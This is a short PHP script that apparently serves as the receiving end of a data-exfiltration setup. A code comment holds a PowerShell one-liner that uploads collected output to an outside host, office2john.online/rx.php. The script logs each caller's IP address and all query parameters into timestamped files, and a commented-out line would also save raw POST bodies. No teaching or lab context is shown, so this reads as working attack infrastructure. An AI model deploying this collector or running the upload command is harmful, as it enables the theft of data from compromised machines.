<?php

/* 
 * 
 * powershell "IEX (New-Object Net.WebClient).UploadString('http://office2john.online/rx.php', $output)"
 */

$file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".txt";
//file_put_contents("uploads/".$file, file_get_contents("php://input"));
$output = $_SERVER['REMOTE_ADDR'] . "\r\n". implode($_GET) . "\r\n" . date("Y-m-d_H-i-s");
file_put_contents("____Logs/".$file, $output);
